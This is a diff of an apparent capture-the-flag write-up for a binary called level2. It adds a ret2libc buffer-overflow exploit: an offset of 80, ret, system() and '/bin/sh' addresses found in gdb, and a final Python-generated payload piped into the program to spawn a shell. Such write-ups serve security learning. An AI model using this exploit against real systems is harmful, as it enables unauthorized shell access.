@@ -82,24 +82,31 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
+using pattern generator we cause overflow and found offset of 80
+
+let's craft our payload which cause overflow to trigger a ret followed by a call to system() and the /bin/sh with 4 bytes padding.
+
 ```sh
-0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
-
-76
-```
-
-system
+ret
 0x0804853e
 \x3e\x85\x04\x08
 
-ret
+system
 0xb7e6b060
 \x60\xb0\xe6\xb7
+```
 
-SHELL
-0xbffff94d
-\x4d\xf9\xff\xbf
+```sh
+(gdb) find &system, +9999999, "/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
 
-cat <(python -c "print '\x90' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'aaaa' +'\x35\xf9\xff\xbf'") - | ./level2
+/bin/sh @ \x58\xcc\xf8\xb7
 
-cat <(python -c "print '\x90' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'aaaa' + '\x4d\xf9\xff\xbf'") - | ./level2
+the final payload
+
+```sh
+cat <(python -c "print '\x90' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7'") - | ./level2
+```
